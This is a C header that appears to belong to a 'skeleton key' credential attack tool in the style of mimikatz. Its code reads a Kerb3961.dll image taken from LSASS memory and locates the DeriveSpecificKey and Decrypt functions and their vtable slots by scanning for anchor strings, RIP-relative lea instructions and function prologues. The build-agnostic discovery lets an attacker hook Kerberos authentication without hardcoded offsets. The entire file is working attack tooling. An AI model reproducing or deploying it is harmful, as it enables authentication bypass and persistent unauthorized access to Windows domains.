/*
 * skel_discover.h — dynamic discovery of Kerb3961.dll DeriveSpecificKey/Decrypt
 * vtable slots + function RVAs (build-agnostic, replaces hardcoded RVAs).
 *
 * Pure byte-buffer logic — no Win32, no CRT beyond strlen. The caller supplies
 * the raw module image (read from LSASS or a file) and the image base.
 *
 * Algorithm per hook (mirrors the old RC4 hook's kuhl_m_buf_* primitives):
 *   1. find the unique anchor string,
 *   2. find every RIP-relative `lea` referencing it,
 *   3. walk each lea back over 0xCC padding to the function prologue,
 *   4. scan non-writable sections for the 8-byte pointer == base+fn (the vtable
 *      slot) — keep the function that actually HAS a slot (shared strings like
 *      "SecureEqualBuffer(hmac, checksum)" are referenced by >1 function).
 *
 * GOTCHA: the prologue matcher MUST accept REX-prefixed `push rbp` (40 55) —
 * 0x18500 starts with `40 55`, not bare `55`, and missing it makes the
 * walk-back overshoot to the previous function.
 */
#ifndef SKEL_DISCOVER_H
#define SKEL_DISCOVER_H

#include <stdint.h>
#include <string.h>

static int skel_disc_is_prologue(const uint8_t *p)
{
    if (p[0] == 0x48 && p[1] == 0x8b && p[2] == 0xc4) return 1;                       /* mov rax,rsp */
    if (p[0] == 0x48 && p[1] == 0x89 && p[3] == 0x24 &&
        (p[2] == 0x5c || p[2] == 0x4c || p[2] == 0x6c || p[2] == 0x74 || p[2] == 0x7c)) return 1; /* mov [rsp+disp8],reg */
    if (p[0] == 0x48 && p[1] == 0x83 && p[2] == 0xec) return 1;                       /* sub rsp,imm8 */
    if (p[0] >= 0x50 && p[0] <= 0x57) return 1;                                       /* push rax..rdi */
    if ((p[0] == 0x40 || p[0] == 0x41) && p[1] >= 0x50 && p[1] <= 0x57) return 1;    /* push w/ REX (40 55, 41 54-57, …) */
    return 0;
}

/* find ASCII string; return offset or -1 */
static long skel_disc_find_ascii(const uint8_t *buf, uint32_t size, const char *s)
{
    uint32_t slen = (uint32_t)strlen(s), i, j;
    if (slen == 0) return -1;
    for (i = 0; i + slen <= size; i++) {
        for (j = 0; j < slen; j++)
            if (buf[i + j] != (uint8_t)s[j]) break;
        if (j == slen) return (long)i;
    }
    return -1;
}

/* walk back over 0xCC padding to a recognized prologue; return fn offset or -1 */
static long skel_disc_walk_prologue(const uint8_t *buf, long off)
{
    long i = off;
    while (i > 0) {
        if (buf[i] == 0xCC) {
            long rs = i;
            while (rs > 0 && buf[rs - 1] == 0xCC) rs--;
            if (skel_disc_is_prologue(buf + i + 1)) return i + 1;
            i = rs - 1;
        } else i--;
        if (off - i > 0x1000) break;
    }
    return -1;
}

/* scan non-writable sections for the 8-byte fnVa (the vtable slot); return
 * slot RVA if exactly one, else -1 */
static long skel_disc_find_slot(const uint8_t *buf, uint32_t size, uint64_t fnVa)
{
    uint32_t e_lfanew, pe, nsec, optsize, vaddr, vsize, chars, o, end, start;
    long found = -1;
    int cnt = 0;

    if (size < 0x40) return -1;
    if (buf[0] != 'M' || buf[1] != 'Z') return -1;
    e_lfanew = *(const uint32_t *)(buf + 0x3c);
    if (e_lfanew + 0x18 > size) return -1;
    pe = e_lfanew;
    if (*(const uint32_t *)(buf + pe) != 0x00004550) return -1;   /* "PE\0\0" */
    nsec = *(const uint16_t *)(buf + pe + 6);
    optsize = *(const uint16_t *)(buf + pe + 0x14);

    for (uint32_t i = 0; i < nsec; i++) {
        const uint8_t *s = buf + pe + 0x18 + optsize + i * 0x28;
        vsize = *(const uint32_t *)(s + 0x08);
        vaddr = *(const uint32_t *)(s + 0x0c);
        chars = *(const uint32_t *)(s + 0x24);
        if (chars & 0x80000000) continue;       /* skip writable */
        if (!(chars & 0x40000000)) continue;    /* require readable */
        end = vaddr + vsize;
        if (end > size) end = size;
        start = (vaddr + 7) & ~7u;
        for (o = start; o + 8 <= end; o += 8) {
            if (*(const uint64_t *)(buf + o) == fnVa) { cnt++; found = (long)o; }
        }
    }
    return (cnt == 1) ? found : -1;
}

/* resolve one hook from its anchor: on success sets *fnRva and *slotRva, returns 0 */
static int skel_disc_discover(const uint8_t *buf, uint32_t size, uint64_t base,
                              const char *anchor, long *fnRva, long *slotRva)
{
    long strOff = skel_disc_find_ascii(buf, size, anchor);
    if (strOff < 0) return -1;

    for (uint32_t i = 0; i + 7 < size; i++) {
        if (buf[i] == 0x48 && buf[i + 1] == 0x8d) {
            uint8_t rm = buf[i + 2];
            if (((rm >> 6) & 3) == 0 && (rm & 7) == 0x05) {          /* lea reg,[rip+disp32] */
                int32_t disp = *(const int32_t *)(buf + i + 3);
                if ((int32_t)i + 7 + disp == strOff) {
                    long fn = skel_disc_walk_prologue(buf, (long)i);
                    if (fn < 0) continue;
                    long slot = skel_disc_find_slot(buf, size, base + (uint64_t)fn);
                    if (slot >= 0) {
                        *fnRva = fn;
                        *slotRva = slot;
                        return 0;
                    }
                }
            }
        }
    }
    return -1;
}

#endif /* SKEL_DISCOVER_H */
